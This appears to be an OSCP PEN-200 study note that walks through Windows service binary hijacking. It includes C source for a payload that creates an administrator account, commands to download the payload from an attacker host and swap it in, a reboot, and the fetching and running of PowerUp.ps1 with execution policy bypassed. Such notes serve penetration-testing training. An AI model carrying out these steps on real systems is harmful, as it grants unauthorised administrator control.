# 🪟 OSCP PEN-200 — Service Binary Hijacking

> **Goal:** Replace a vulnerable service binary → reboot → escalate to local Administrator

---

## 📖 Concept

When a Windows service binary has **overly permissive file permissions**, a low-privileged
user can replace it with a malicious binary. On the next service start or reboot, the
malicious binary runs with the **privileges of the service** (e.g., `LocalSystem`).

```
Low-priv user → finds service binary writable by Users group
→ replaces binary with malicious .exe
→ restarts service or reboots
→ malicious binary runs as SYSTEM
```

---

## 🗺️ Attack Flow

### Step 1 — Enumerate Running Services

```powershell
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

> ⚠️ Use **RDP (interactive logon)**. `Get-CimInstance` returns permission denied
> over WinRM / bind shell for non-admin users.

**What to look for:** Binaries **not** in `C:\Windows\System32` — user-installed apps
are developer-managed and prone to weak permissions.

---

### Step 2 — Check Binary Permissions

```powershell
icacls "C:\path\to\service.exe"
```

**Permission masks:**

| Mask | Permission |
|---|---|
| `F` | Full access |
| `M` | Modify access ← also sufficient for hijack |
| `RX` | Read and execute — not enough |
| `R` | Read-only — not enough |
| `W` | Write-only |

**What to look for:**

| Output | Meaning |
|---|---|
| `BUILTIN\Users:(F)` | ✅ Vulnerable — Full access |
| `Authenticated Users:(M)` | ✅ Vulnerable — Modify access |
| `BUILTIN\Users:(RX)` | ❌ Not vulnerable |
| No `(I)` prefix | Set explicitly (not inherited) — intentional misconfiguration |

---

### Step 3 — Check Startup Type

```powershell
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<ServiceName>'}
```

| StartMode | Meaning |
|---|---|
| `Auto` | ✅ Starts on reboot — no manual trigger needed |
| `Manual` | Must be started explicitly |

---

### Step 4 — Check Reboot Privilege

```cmd
whoami /priv
```

Look for `SeShutdownPrivilege` — `Disabled` state is fine, it just means the current
process isn't using it right now.

---

### Step 5 — Create Malicious Binary (Kali)

**`adduser.c`**

```c
#include <stdlib.h>

int main()
{
    int i;
    i = system("net user hacker password123! /add");
    i = system("net localgroup administrators hacker /add");
    return 0;
}
```

**Compile & serve:**

```bash
x86_64-w64-mingw32-gcc adduser.c -o service_name.exe
python3 -m http.server 80
```

> Name the output to match the target binary exactly.

---

### Step 6 — Transfer & Replace Binary (Target)

```powershell
# Download malicious binary
iwr -uri http://<KALI_IP>/service_name.exe -Outfile service_name.exe

# Backup original
move C:\path\to\service.exe C:\Users\<user>\Desktop\service.exe.bak

# Replace with malicious binary
move .\service_name.exe C:\path\to\service.exe
```

---

### Step 7 — Restart the Service

**Try manually first:**

```cmd
net stop <ServiceName>
net start <ServiceName>
```

**If access denied → reboot:**

```cmd
shutdown /r /t 0
```

> ⚠️ Never reboot production systems without client IT staff collaboration.

---

### Step 8 — Verify Escalation

```powershell
Get-LocalGroupMember administrators
```

✅ Your new user should appear in the list.

---

### Step 9 — Restore Original State

```powershell
del C:\path\to\service.exe
move C:\Users\<user>\Desktop\service.exe.bak C:\path\to\service.exe
net user hacker /delete
shutdown /r /t 0
```

---

## 🤖 Automated Detection — PowerUp.ps1

**Setup on Kali:**

```bash
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

**Run on target:**

```powershell
iwr -uri http://<KALI_IP>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
```

**Key output fields:**

| Field | Meaning |
|---|---|
| `ModifiableFile` | Path to the vulnerable binary |
| `ModifiableFileIdentityReference` | Who has write access |
| `StartName` | Account the service runs as |
| `AbuseFunction` | Built-in exploit command |
| `CanRestart` | Whether you can restart without reboot |

---

## ⚠️ PowerUp Limitation — Know This for the Exam

`Install-ServiceBinary` (AbuseFunction) **fails** when the service path contains
an argument that is itself a file path (e.g., `--defaults-file=C:\some\path`).

| Input to `Get-ModifiablePath` | Result |
|---|---|
| `service.exe` | ✅ Works |
| `service.exe argument` | ✅ Works |
| `service.exe --conf=C:\some\path` | ❌ Empty result → AbuseFunction fails |

**Fix:** Use PowerUp to *identify*, then exploit **manually**.

---

## ⚡ Quick Reference

```powershell
# Enumerate running services
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check permissions
icacls "C:\path\to\service.exe"

# Check startup type
Get-CimInstance -ClassName win32_service | Select Name,StartMode | Where-Object {$_.Name -like '<ServiceName>'}

# Check reboot privilege
whoami /priv

# Stop / Start service
net stop <ServiceName>
net start <ServiceName>

# Reboot
shutdown /r /t 0

# Verify
Get-LocalGroupMember administrators
```

```bash
# Compile payload (Kali)
x86_64-w64-mingw32-gcc adduser.c -o evil.exe

# Serve files
python3 -m http.server 80
```

---
